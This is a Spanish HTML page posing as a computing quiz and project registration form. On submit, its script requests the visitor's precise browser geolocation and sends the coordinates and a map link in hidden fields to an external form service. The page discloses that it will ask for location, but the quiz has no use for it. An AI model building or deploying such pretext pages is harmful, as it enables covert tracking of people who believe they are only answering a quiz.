<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cuestionario de Informática</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #eef2f3; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); width: 100%; max-width: 400px; }
        h2 { text-align: center; color: #2c3e50; margin-bottom: 20px; }
        label { display: block; margin-top: 15px; color: #555; font-weight: bold; }
        input, select, textarea { width: 100%; padding: 12px; margin-top: 5px; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
        button { width: 100%; padding: 15px; background-color: #27ae60; color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 25px; transition: background 0.3s; }
        button:hover { background-color: #219150; }
        #status { font-size: 12px; text-align: center; color: #888; margin-top: 10px; }
    </style>
</head>
<body>

<div class="card">
    <h2>Registro de Proyecto</h2>
    
    <form id="registroForm" action="https://formspree.io/f/TU_ID_AQUI" method="POST">
        
        <label>Nombre:</label>
        <input type="text" name="nombre" placeholder="Tu nombre" required>

        <label>Correo:</label>
        <input type="email" name="email" placeholder="ejemplo@correo.com" required>

        <label>¿Sabes qué es programación?</label>
        <select name="conoce_progra">
            <option value="si">Sí</option>
            <option value="no">No</option>
        </select>

        <label>¿Has compartido ubicación o internet?</label>
        <textarea name="ha_compartido" rows="2" placeholder="Cuéntanos tu experiencia..."></textarea>

        <input type="hidden" name="Latitud" id="lat">
        <input type="hidden" name="Longitud" id="lon">
        <input type="hidden" name="Mapa" id="map_link">

        <button type="button" onclick="obtenerUbicacionYEnviar()">Enviar Registro</button>
        <p id="status">Se solicitará permiso de ubicación al enviar.</p>
    </form>
</div>

<script>
    function obtenerUbicacionYEnviar() {
        const status = document.getElementById('status');
        const form = document.getElementById('registroForm');

        if (!navigator.geolocation) {
            status.textContent = "Tu navegador no soporta geolocalización.";
            form.submit(); // Envía el formulario aunque no haya GPS
            return;
        }

        status.textContent = "Obteniendo ubicación... por favor acepta el permiso.";

        navigator.geolocation.getCurrentPosition(
            (posicion) => {
                // ÉXITO: El usuario aceptó
                const lat = posicion.coords.latitude;
                const lon = posicion.coords.longitude;
                
                document.getElementById('lat').value = lat;
                document.getElementById('lon').value = lon;
                document.getElementById('map_link').value = `https://www.google.com/maps?q=${lat},${lon}`;
                
                status.textContent = "Ubicación obtenida. Enviando...";
                form.submit();
            },
            (error) => {
                // ERROR: El usuario denegó o hubo fallo de GPS
                console.error(error);
                status.textContent = "No se pudo obtener la ubicación, enviando solo datos...";
                form.submit();
            },
            { enableHighAccuracy: true, timeout: 10000 }
        );
    }
</script>

</body>
</html>
